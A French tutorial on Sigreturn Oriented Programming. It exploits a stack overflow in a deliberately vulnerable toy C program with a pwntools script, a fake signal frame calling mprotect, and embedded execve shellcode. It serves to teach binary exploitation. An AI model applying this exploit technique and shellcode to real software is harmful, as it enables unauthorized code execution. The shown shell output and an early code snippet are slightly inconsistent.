# Sigreturn Oriented Programming 

Hello à tous :) Dans cet article je vais vous montrer une technique de ROP qui à l'aventage de nécessiter très peu de gadget (deux seulement en fait ;) )

Avant de commencer la ptite pub habituelle:

Follow twitter @QuasarPwn

Serveur Discord: [Mon serveur discord](https://discord.gg/2bwhtP7)

Prenons un petit programme pour illustrer la technique:

```c
#include <stdio.h>
#include <stdlib.h>

void syscall(){
       __asm__("syscall; ret;");
}

void rax(){
       __asm__("movl $0xf, %eax; ret;");
}

int main(){
       char buffer[100];
       printf("Buffer: %p.\n", buffer);
       read(0, buffer, 5000);
       return 0;
}
```

Comme vous le devinez surement les gadget dont on aura besoin sont ```syscall; ret``` et ```mov eax,0xf; ret``` !
Maintenant passons à l'explication de comment l'exploitation se fera !

1. Tout d'abord on va récuperer les addresse de nos gadgets.
2. Ensuite on va leak l'addresse de buffer, pour le coup notre programme ne contient aucun leak (format string ou autre) mais le programme printf bien gentiment l'addresse de buffer !
3. On va rendre buffer executable, on va créer une "trame de signal" qui pourra faire le syscall MPROTECT sur l'addresse de buffer (vous allez voir pas d'inquietude si vous ne comprenez pas ! ) 
4. On me un shellcode dans buffer et enfin on saute sur ce shellcode !

D'abord compilons notre programme:
```quasar@pwn:~/Bureau/pwn$ gcc -o sop sop.c -no-pie```

Ensuite on va utiliser ROPgadget pour récuperer nos gadgets:
```
quasar@pwn:~/Bureau/pwn$ ROPgadget --binary sop
Gadgets information
============================================================
0x0000000000400562 : adc byte ptr [rax], ah ; jmp rax
0x0000000000400561 : adc byte ptr [rax], spl ; jmp rax
0x000000000040055e : adc dword ptr [rbp - 0x41], ebx ; adc byte ptr [rax], spl ; jmp rax
0x0000000000400618 : add bl, al ; nop ; pop rbp ; ret
0x00000000004006ef : add bl, dh ; ret
0x0000000000400616 : add byte ptr [rax], al ; add bl, al ; nop ; pop rbp ; ret
0x00000000004006ed : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004006eb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x000000000040056c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006ec : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040049b : add byte ptr [rax], al ; add rsp, 8 ; ret
0x000000000040056e : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000400617 : add byte ptr [rax], al ; ret
0x00000000004005d8 : add byte ptr [rcx], al ; ret
0x00000000004005d4 : add eax, 0x200a6e ; add ebx, esi ; ret
0x0000000000400678 : add eax, 0xfffe42e8 ; dec ecx ; ret
0x00000000004005d9 : add ebx, esi ; ret
0x000000000040049e : add esp, 8 ; ret
0x000000000040049d : add rsp, 8 ; ret
0x00000000004005d7 : and byte ptr [rax], al ; add ebx, esi ; ret
0x00000000004005fe : call rax
0x000000000040073b : call rsp
0x000000000040067d : dec ecx ; ret
0x00000000004006cc : fmul qword ptr [rax - 0x7d] ; ret
0x0000000000400613 : in eax, 0xb8 ; sldt word ptr [rax] ; add bl, al ; nop ; pop rbp ; ret
0x00000000004005f9 : int1 ; push rbp ; mov rbp, rsp ; call rax
0x000000000040055d : je 0x400578 ; pop rbp ; mov edi, 0x601048 ; jmp rax
0x00000000004005ab : je 0x4005c0 ; pop rbp ; mov edi, 0x601048 ; jmp rax
0x00000000004005f8 : je 0x4005f1 ; push rbp ; mov rbp, rsp ; call rax
0x0000000000400565 : jmp rax
0x000000000040067e : leave ; ret
0x00000000004005d3 : mov byte ptr [rip + 0x200a6e], 1 ; ret
0x0000000000400614 : mov eax, 0xf ; ret
0x00000000004005fc : mov ebp, esp ; call rax
0x0000000000400612 : mov ebp, esp ; mov eax, 0xf ; ret
0x0000000000400608 : mov ebp, esp ; syscall
0x0000000000400560 : mov edi, 0x601048 ; jmp rax
0x00000000004005fb : mov rbp, rsp ; call rax
0x0000000000400611 : mov rbp, rsp ; mov eax, 0xf ; ret
0x0000000000400607 : mov rbp, rsp ; syscall
0x0000000000400499 : movsxd rax, dword ptr [rax] ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x000000000040060d : nop ; pop rbp ; ret
0x0000000000400568 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004006e8 : nop dword ptr [rax + rax] ; ret
0x00000000004005b5 : nop dword ptr [rax] ; pop rbp ; ret
0x00000000004005d6 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; ret
0x00000000004005ac : or ebx, dword ptr [rbp - 0x41] ; adc byte ptr [rax], spl ; jmp rax
0x00000000004005d5 : outsb dx, byte ptr [rsi] ; or ah, byte ptr [rax] ; add byte ptr [rcx], al ; ret
0x00000000004006dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006e0 : pop r14 ; pop r15 ; ret
0x00000000004006e2 : pop r15 ; ret
0x00000000004005d2 : pop rbp ; mov byte ptr [rip + 0x200a6e], 1 ; ret
0x000000000040055f : pop rbp ; mov edi, 0x601048 ; jmp rax
0x00000000004006db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006df : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400570 : pop rbp ; ret
0x00000000004006e3 : pop rdi ; ret
0x00000000004006e1 : pop rsi ; pop r15 ; ret
0x00000000004006dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004005fa : push rbp ; mov rbp, rsp ; call rax
0x0000000000400610 : push rbp ; mov rbp, rsp ; mov eax, 0xf ; ret
0x0000000000400606 : push rbp ; mov rbp, rsp ; syscall
0x00000000004004a1 : ret
0x00000000004002ba : ret 0xba
0x00000000004005aa : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax
0x000000000040055c : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax
0x00000000004005f7 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax
0x0000000000400615 : sldt word ptr [rax] ; add bl, al ; nop ; pop rbp ; ret
0x00000000004006f5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004006f4 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040060a : syscall
0x000000000040056a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006ea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004005f6 : test eax, eax ; je 0x4005f3 ; push rbp ; mov rbp, rsp ; call rax
0x00000000004005f5 : test rax, rax ; je 0x4005f4 ; push rbp ; mov rbp, rsp ; call rax

Unique gadgets found: 76

```

Le gadget qui met 15 (numéro syscall en 64 bits pour sigreturn) dans eax ```0x0000000000400614 : mov eax, 0xf ; ret```
Le ```0x000000000040060a : syscall``` n'a pas l'air clean .. Ou est notre ret ? Pour eviter tout problème on va use pwndbg pour récuperer l'addresse de ce gadget:

```
pwndbg> disass syscall
Dump of assembler code for function syscall:
   0x0000000000400606 <+0>:	push   rbp
   0x0000000000400607 <+1>:	mov    rbp,rsp
   0x000000000040060a <+4>:	syscall 
   0x000000000040060c <+6>:	ret    
   0x000000000040060d <+7>:	nop
   0x000000000040060e <+8>:	pop    rbp
   0x000000000040060f <+9>:	ret    
End of assembler dump.
pwndbg> 

```

Finalement l'addresse etait totalement clean deuxième gadget: ```0x000000000040060a : syscall```
Deuxième chose, on a toujours pas calculer notre offset :') :
```
quasar@pwn:~/Bureau/pwn$ python -c 'print "a"*120' | ./sop
Buffer: 0x7ffe2df2bc70.
Buffer: 0x7ffe2df2bc70.
quasar@pwn:~/Bureau/pwn$ python -c 'print "a"*121' | ./sop
Buffer: 0x7ffd9b05aa40.
Erreur de segmentation (core dumped)
quasar@pwn:~/Bureau/pwn$ 
```
on aurait pu faire de façon plus propre mais osef ¯\_(ツ)_/¯

On peux commencer à ecrire notre exploit:
```python 
from pwn import *

p = p("./sop")

sigreturn_num_rax = 0x0000000000400614
syscall = 0x000000000040060a 

pad = 120
```

Prochaine étape leak l'addresse de Buffer, easy ! 

```python 
p.recvuntil("0x")
leak = int(p.recvuntil(".")[:-1], 16)
log.info("Leak: " + str(hex(leak)))
```

Parfait ! 
Faisons un premier payload:
```python
payload = "A"*pad
payload += p64(sigreturn_num_rax)
payload += p64(syscall)
```

Passons au chose serieux ! Il faut rendre l'addresse de buffer executable, pour cela créons un trame de signal comme celà, merci pwntools !

```python
trame = SigreturnFrame(kernel="amd64") 
trame.rax = 10 
trame.rdi = leak
trame.rsi = 2000
trame.rdx = 7
trame.rsp = leak + len(payload) + 248
trame.rip = syscall
```

Maintenant que vous êtes tous en mode "Hein ? C koi ça ? " (fin à part sui vous êtes là juste pour verifier que je raconte pas de la merde et que vous maitriser dejas la technique )

première ligne on crée une "fausse" trame de signal, 
on met rax à 10 qui est le nombre du syscall de MPROTECT,
on met l'addresse de leak dans rdi, c'est là qu'on met l'addresse qui va être rendu executable,
et enfin dans rip on met l'addresse de syscall evidament on va donc executer mprotect avec se qu'on a mis dans nos different registre (on va pas s'attarder sur ça, voici la [page manuel de mprotect](http://man7.org/linux/man-pages/man2/mprotect.2.html))

On rajoute donc tout ça dans notre payload:
```python 
payload += str(trame)
payload += p64(leak)
```
on saute sur leak qui contient notre shellcode et voila notre shell !
[!like a boss](https://media2.giphy.com/media/sGpHE1wS1PFWo/source.gif)

Exploit final :
```python
from pwn import *

p = process("./sop")

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

sigreturn_num_rax = 0x0000000000400614
syscall = 0x000000000040060a 

pad = 120

p.recvuntil("0x")
leak = int(p.recvuntil(".")[:-1], 16)
log.info("Leak: " + str(hex(leak)))

payload = "A"*pad
payload += p64(sigreturn_num_rax)
payload += p64(syscall)

trame = SigreturnFrame(kernel="amd64") 
trame.rax = 10 
trame.rdi = leak
trame.rsi = 2000
trame.rdx = 7
trame.rsp = leak + len(payload) + 248
trame.rip = syscall

payload += str(trame)
payload += p64(leak)

p.sendline(payload)
p.interactive()
```

Ahaha ! Aller à la prochaine !

```
quasar@pwn:~/Bureau/pwn$ sh
$ ls
core  exploit.py  pad  sop  sop.c  Untitled-1
$ id
uid=1000(quasar) gid=1000(quasar) groupes=1000(quasar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ 
```

Bon nos droits ne change pas mais on avais pas donné de droit au binaire :)



